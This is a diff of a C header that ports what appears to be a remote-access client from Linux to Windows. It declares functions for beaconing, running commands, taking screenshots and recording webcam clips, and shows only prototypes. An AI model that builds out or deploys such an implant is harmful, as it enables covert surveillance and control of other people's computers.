@@ -1,16 +1,20 @@
+#ifndef CLIENT_H
+#define CLIENT_H
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <time.h>
-#include <unistd.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <windows.h>
 #include <openssl/sha.h>
 #include <openssl/evp.h>
 #include <openssl/rand.h>
-#include <sys/utsname.h>
-#include <pthread.h>
+
+#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "libssl.lib")
+#pragma comment(lib, "libcrypto.lib")
 
 #define SALT_SIZE 32
 #define IV_SIZE 12
@@ -19,7 +23,7 @@
 #define CHUNK_SIZE 1024
 
 // Globals
-int client_socket = -1;
+SOCKET client_socket = INVALID_SOCKET;
 time_t start_time;
 int exit_process = 0;
 char* SESSION_ID = NULL;
@@ -56,10 +60,12 @@ void get_uptime();
 char* run_command(const char* command);
 void parse_action(const char* action);
 int get_retry_interval(int retries);
-unsigned short* utf8_to_utf16(const char* str);
-void* beacon_interval_thread(void* arg);
+WCHAR* utf8_to_utf16(const char* str);
+DWORD WINAPI beacon_interval_thread(LPVOID lpParam);
 void start_beacon_interval();
 void run_screenshot();
 void run_webcam_clip();
 int connect_to_server();
 void handle_connection();
+
+#endif // CLIENT_H
